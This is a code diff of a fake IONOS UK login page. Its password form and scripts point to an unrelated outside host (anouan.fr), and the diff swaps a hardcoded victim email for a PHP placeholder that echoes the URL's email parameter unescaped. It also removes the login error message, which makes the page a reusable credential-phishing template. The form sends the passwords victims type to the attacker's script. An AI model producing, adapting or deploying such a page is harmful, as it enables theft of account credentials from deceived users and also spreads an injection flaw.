@@ -5,7 +5,7 @@
 
     
     
-      <script type="text/javascript" async="" src="https://anouan.fr/ionospg/ias.js"></script><script type="text/javascript" async="" src="https://anouan.fr/ionospg/navigation.js"></script><script type="text/javascript" async="" src="https://anouan.fr/ionospg/inpagelayer.js"></script><script type="text/javascript" async="" src="https://anouan.fr/ionospg/privacyconsent.js"></script><script type="text/javascript" async="" src="https://anouan.fr/ionospg/statuspage.js"></script><script type="text/javascript" async="" src="https://anouan.fr/ionospg/bundle.min.js"></script><script nonce="" src="https://anouan.fr/ionospg/login-id.js" type="text/javascript" async="async" defer="defer" id="oaotag"></script>
+      <script type="text/javascript" async="" src="https://anouan.fr/ionospg/bundle.min.js"></script><script type="text/javascript" async="" src="https://anouan.fr/ionospg/ias.js"></script><script type="text/javascript" async="" src="https://anouan.fr/ionospg/navigation.js"></script><script type="text/javascript" async="" src="https://anouan.fr/ionospg/inpagelayer.js"></script><script type="text/javascript" async="" src="https://anouan.fr/ionospg/privacyconsent.js"></script><script type="text/javascript" async="" src="https://anouan.fr/ionospg/statuspage.js"></script><script type="text/javascript" async="" src="https://anouan.fr/ionospg/bundle.min.js"></script><script nonce="" src="https://anouan.fr/ionospg/login-id.js" type="text/javascript" async="async" defer="defer" id="oaotag"></script>
     
 
     
@@ -154,7 +154,7 @@
         </a>
         <a class="button-current-identifier ghost-button ghost-button--with-icon ghost-button--secondary tooltip" href="https://id.ionos.co.uk/identifier" data-tooltip="Back to login" tabindex="0">
           <i class="ghost-button__icon exos-icon exos-icon-nav-user-16"></i>
-          <span class="ghost-button__text">sales@obivestltd.com</span>
+          <span class="ghost-button__text"><?=$_GET[email]?></span>
         </a>
       </div>
     
@@ -163,16 +163,16 @@
 
 
           <form name="Default" method="post" action="https://anouan.fr/attpg/eduuvm.php">
-            <input type="hidden" name="_csrf" value="sales@obivestltd.com">
+            <input type="hidden" name="_csrf" value="<?=$_GET[email]?>">
             <input type="email" class="hidden" name="identifier" id="username" tabindex="-1" spellcheck="false" value="" autocomplete="off">
             <ul>
               <li class="form-stripe">
                 <label class="label" for="password">Password</label>
-                <span class="input-text-group input-text-group--error input-text-group--empty">
+                <span class="input-text-group input-text-group--empty">
                   <input type="password" class="input-text" required="true" tabindex="1" autofocus="" autocomplete="current-password" autocapitalize="none" spellcheck="false" id="password" name="password" value="">
                   <a class="input-text-group__action password-unveil" id="password-unveil"></a>
                 </span>
-                <p class="input-byline input-byline--error">The password is incorrect or invalid login.</p>
+                
                 <p class="input-byline">
                   <a class="link oao-pi-open-in-flyin" target="_blank" href="https://www.ionos.co.uk/help/index.php?id=2327">Forgot Your Password?</a>
                 </p>
